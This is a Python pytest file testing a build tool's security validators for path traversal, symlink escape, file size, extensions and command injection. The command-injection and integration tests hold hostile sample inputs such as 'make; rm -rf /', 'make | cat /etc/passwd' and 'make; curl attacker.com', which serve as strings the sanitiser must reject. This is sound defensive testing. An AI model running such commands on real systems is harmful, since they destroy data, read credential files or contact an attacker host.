"""Security tests for path operations and file access validation."""

from __future__ import annotations

import pytest
import tempfile
from pathlib import Path

from gmake2cmake.security import (
    validate_path_in_sandbox,
    validate_symlink_target,
    validate_file_size,
    validate_file_extension,
    create_sandbox,
    sanitize_command_arg,
    validate_identifier,
    PathTraversalError,
    SandboxViolationError,
    ResourceExhaustionError,
    SecurityError,
    MAX_FILE_SIZE_BYTES,
)


class TestPathTraversalPrevention:
    """Tests for path traversal attack prevention (CWE-22)."""

    def test_valid_path_within_sandbox(self, tmp_path):
        """Relative path within sandbox should be accepted."""
        sandbox = tmp_path / "sandbox"
        sandbox.mkdir()
        file_path = sandbox / "file.txt"

        result = validate_path_in_sandbox(file_path, sandbox)
        assert result == file_path.resolve()

    def test_absolute_path_within_sandbox(self, tmp_path):
        """Absolute path within sandbox should be accepted."""
        sandbox = tmp_path / "sandbox"
        sandbox.mkdir()
        file_path = sandbox / "subdir" / "file.txt"

        result = validate_path_in_sandbox(file_path, sandbox)
        assert result == file_path.resolve()

    def test_parent_directory_traversal_blocked(self, tmp_path):
        """Attempt to traverse to parent directory should be blocked."""
        sandbox = tmp_path / "sandbox"
        sandbox.mkdir()
        evil_path = sandbox / ".." / "escape.txt"

        with pytest.raises(PathTraversalError):
            validate_path_in_sandbox(evil_path, sandbox)

    def test_multiple_traversal_attempts_blocked(self, tmp_path):
        """Multiple .. traversal attempts should be blocked."""
        sandbox = tmp_path / "sandbox"
        sandbox.mkdir()
        evil_path = sandbox / ".." / ".." / ".." / "escape.txt"

        with pytest.raises(PathTraversalError):
            validate_path_in_sandbox(evil_path, sandbox)

    def test_absolute_path_outside_sandbox_blocked(self, tmp_path):
        """Absolute path outside sandbox should be blocked."""
        sandbox = tmp_path / "sandbox"
        sandbox.mkdir()
        outside = tmp_path / "outside.txt"

        with pytest.raises(PathTraversalError):
            validate_path_in_sandbox(outside, sandbox)

    def test_symlink_escape_prevented(self, tmp_path):
        """Symlink pointing outside sandbox should be caught."""
        sandbox = tmp_path / "sandbox"
        sandbox.mkdir()
        outside = tmp_path / "outside.txt"
        outside.write_text("secret")

        symlink = sandbox / "evil_link"
        symlink.symlink_to(outside)

        with pytest.raises(SandboxViolationError):
            validate_symlink_target(symlink, sandbox)

    def test_symlink_within_sandbox_allowed(self, tmp_path):
        """Symlink within sandbox should be allowed."""
        sandbox = tmp_path / "sandbox"
        sandbox.mkdir()
        target = sandbox / "target.txt"
        target.write_text("content")

        symlink = sandbox / "link"
        symlink.symlink_to(target)

        result = validate_symlink_target(symlink, sandbox)
        assert result.resolve() == target.resolve()


class TestFileSizeValidation:
    """Tests for resource exhaustion prevention (CWE-190)."""

    def test_small_file_accepted(self, tmp_path):
        """Small file should be accepted."""
        file_path = tmp_path / "file.txt"
        file_path.write_text("small content")

        size = validate_file_size(file_path)
        assert size == len("small content")

    def test_large_file_rejected(self, tmp_path):
        """File exceeding limit should be rejected."""
        file_path = tmp_path / "large.txt"
        # Create a file that's larger than limit
        with open(file_path, 'wb') as f:
            f.write(b'x' * (MAX_FILE_SIZE_BYTES + 1))

        with pytest.raises(ResourceExhaustionError):
            validate_file_size(file_path)

    def test_custom_size_limit(self, tmp_path):
        """Custom size limit should be respected."""
        file_path = tmp_path / "file.txt"
        content = "x" * 1000
        file_path.write_text(content)

        # Limit smaller than file
        with pytest.raises(ResourceExhaustionError):
            validate_file_size(file_path, max_bytes=100)

        # Limit larger than file
        size = validate_file_size(file_path, max_bytes=2000)
        assert size == 1000

    def test_nonexistent_file_error(self, tmp_path):
        """Checking nonexistent file should raise FileNotFoundError."""
        with pytest.raises(FileNotFoundError):
            validate_file_size(tmp_path / "nonexistent.txt")


class TestFileExtensionValidation:
    """Tests for file type restrictions."""

    def test_makefile_extension_allowed(self, tmp_path):
        """Makefile should be allowed."""
        file_path = tmp_path / "Makefile"
        file_path.write_text("")

        ext = validate_file_extension(file_path)
        assert ext == ""

    def test_makefile_fragment_allowed(self, tmp_path):
        """Makefile fragments with .mk should be allowed."""
        file_path = tmp_path / "rules.mk"
        file_path.write_text("")

        ext = validate_file_extension(file_path)
        assert ext == ".mk"

    def test_forbidden_extension_blocked(self, tmp_path):
        """Executable files should be blocked."""
        file_path = tmp_path / "malicious.exe"
        file_path.write_text("")

        with pytest.raises(SecurityError):
            validate_file_extension(file_path)

    def test_custom_allowed_extensions(self, tmp_path):
        """Custom allowlist should be respected."""
        file_path = tmp_path / "file.txt"
        file_path.write_text("")

        # .txt not in default list, but should be accepted
        ext = validate_file_extension(file_path, allowed={".txt", ".md"})
        assert ext == ".txt"


class TestSandboxCreation:
    """Tests for sandbox initialization and validation."""

    def test_create_sandbox_success(self, tmp_path):
        """Creating sandbox in valid directory should succeed."""
        sandbox = tmp_path / "sandbox"
        sandbox.mkdir()

        result = create_sandbox(sandbox, must_exist=True)
        assert result.is_dir()
        assert result == sandbox.resolve()

    def test_create_nonexistent_sandbox(self, tmp_path):
        """Creating new sandbox directory should work."""
        sandbox = tmp_path / "new_sandbox"

        result = create_sandbox(sandbox, must_exist=False)
        assert result.exists()
        assert result.is_dir()

    def test_missing_sandbox_error(self, tmp_path):
        """Missing sandbox with must_exist=True should raise error."""
        sandbox = tmp_path / "missing"

        with pytest.raises(FileNotFoundError):
            create_sandbox(sandbox, must_exist=True)


class TestCommandSanitization:
    """Tests for command injection prevention (CWE-78)."""

    def test_clean_argument_allowed(self):
        """Clean arguments should be allowed."""
        result = sanitize_command_arg("make")
        assert result == "make"

    def test_pipe_injection_blocked(self):
        """Pipe characters should be blocked."""
        with pytest.raises(SecurityError):
            sanitize_command_arg("make | cat /etc/passwd")

    def test_semicolon_injection_blocked(self):
        """Semicolon command separator should be blocked."""
        with pytest.raises(SecurityError):
            sanitize_command_arg("make; rm -rf /")

    def test_ampersand_injection_blocked(self):
        """Ampersand for backgrounding should be blocked."""
        with pytest.raises(SecurityError):
            sanitize_command_arg("make & evil_command")

    def test_backtick_injection_blocked(self):
        """Backticks for command substitution should be blocked."""
        with pytest.raises(SecurityError):
            sanitize_command_arg("`rm -rf /`")

    def test_dollar_expansion_blocked(self):
        """Dollar sign expansion should be blocked."""
        with pytest.raises(SecurityError):
            sanitize_command_arg("$(evil_command)")

    def test_newline_injection_blocked(self):
        """Newlines should be blocked."""
        with pytest.raises(SecurityError):
            sanitize_command_arg("make\nrm -rf /")

    def test_redirect_injection_blocked(self):
        """Shell redirects should be blocked."""
        with pytest.raises(SecurityError):
            sanitize_command_arg("make > /tmp/secret")


class TestIdentifierValidation:
    """Tests for identifier validation to prevent injection through names."""

    def test_valid_identifier(self):
        """Valid identifiers should be accepted."""
        assert validate_identifier("my_target") == "my_target"
        assert validate_identifier("TARGET-1") == "TARGET-1"
        assert validate_identifier("lib.a") == "lib.a"

    def test_empty_identifier_rejected(self):
        """Empty identifier should be rejected."""
        with pytest.raises(SecurityError):
            validate_identifier("")

    def test_invalid_characters_rejected(self):
        """Special characters should be rejected."""
        with pytest.raises(SecurityError):
            validate_identifier("target;malicious")

        with pytest.raises(SecurityError):
            validate_identifier("target|another")

        with pytest.raises(SecurityError):
            validate_identifier("target&another")

    def test_length_limit_enforced(self):
        """Identifier length limit should be enforced."""
        long_name = "a" * 300
        with pytest.raises(SecurityError):
            validate_identifier(long_name, max_length=256)

    def test_length_limit_custom(self):
        """Custom length limits should be respected."""
        assert validate_identifier("short", max_length=10) == "short"
        with pytest.raises(SecurityError):
            validate_identifier("x" * 20, max_length=10)


class TestSecurityIntegration:
    """Integration tests for complete security workflow."""

    def test_secure_file_access_workflow(self, tmp_path):
        """Complete secure file access should work."""
        sandbox = tmp_path / "project"
        sandbox.mkdir()

        # Create a test Makefile
        makefile = sandbox / "Makefile"
        makefile.write_text("all:\n\techo ok")

        # Validate path in sandbox
        safe_path = validate_path_in_sandbox(makefile, sandbox)
        assert safe_path.exists()

        # Validate extension
        ext = validate_file_extension(safe_path)
        assert ext == ""

        # Validate size
        size = validate_file_size(safe_path)
        assert size > 0

    def test_reject_malicious_workflow(self, tmp_path):
        """Malicious access patterns should be rejected."""
        sandbox = tmp_path / "project"
        sandbox.mkdir()

        # Attempt path traversal
        with pytest.raises(PathTraversalError):
            validate_path_in_sandbox(sandbox / ".." / "escape", sandbox)

        # Attempt invalid command
        with pytest.raises(SecurityError):
            sanitize_command_arg("make; curl attacker.com")

        # Attempt invalid identifier
        with pytest.raises(SecurityError):
            validate_identifier("target;malicious")
